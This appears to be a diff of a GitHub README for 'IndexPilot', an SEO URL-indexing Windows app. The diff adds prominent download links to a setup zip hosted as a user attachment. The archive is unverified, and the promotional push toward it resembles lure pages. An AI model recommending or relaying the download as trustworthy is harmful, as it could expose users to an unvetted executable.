@@ -1,4 +1,4 @@
-[IndexPilot_Setup.zip](https://github.com/user-attachments/files/32374488/IndexPilot_Setup.zip)
+## Download [IndexPilot_Setup.zip](https://github.com/user-attachments/files/32374488/IndexPilot_Setup.zip)
 # 🚀 IndexPilot v1.0.0 — Official Launch!
 
 Welcome to the initial official release of **IndexPilot**, the ultimate Windows desktop application built to streamline URL indexing workflows for SEO professionals, website owners, and digital marketers. 
@@ -53,3 +53,6 @@ Because IndexPilot is an independent software tool, please note the following se
 ## 💻 System Requirements
 * **Operating System:** Windows 10 or Windows 11 (64-bit)
 * **Dependencies:** Microsoft Excel (for `.xlsx` processing features)
+## Download
+ [IndexPilot_Setup.zip](https://github.com/user-attachments/files/32374488/IndexPilot_Setup.zip)
+
